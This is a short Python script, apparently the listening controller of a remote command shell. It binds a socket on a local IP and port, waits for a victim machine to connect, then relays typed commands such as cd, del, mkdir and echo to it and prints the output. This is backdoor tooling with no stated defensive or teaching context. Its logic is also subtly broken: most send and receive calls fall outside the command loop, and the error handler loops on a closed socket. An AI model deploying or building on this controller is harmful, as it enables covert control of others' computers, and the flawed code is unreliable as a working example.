import os
import socket


HOST = "10.0.3.15"
PORT = 2982

# 
server = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
server.bind((HOST,PORT))
server.listen()
done  = False

while not done:

    #dis
    try:
        client, client_address = server.accept()
        print ("[*] ConnSuc!")

        for x in range(0,10000):
            command = input("command> ")
            
            #solving the issue of the no output if doing commands that have no output
            if command[:2] == "cd" and len(command) > 3:
                client.send(command.encode('ascii'))
                continue
            if command[:3] == "del" and len(command) > 4:
                client.send(command.encode('ascii'))
                continue    
            if command[:4] == "echo" and len(command) > 5:
                client.send(command.encode('ascii'))
                continue    

            if command[:5] == "mkdir" and len(command) > 6:
                client.send(command.encode('ascii'))
                continue      
        
        #sending the command
        client.send(command.encode('ascii'))
        
        #receive the command from the client
        output = client.recv(4096).decode('ascii')
        print(output)

    except:
        client.close()
        server.close()
        done = False


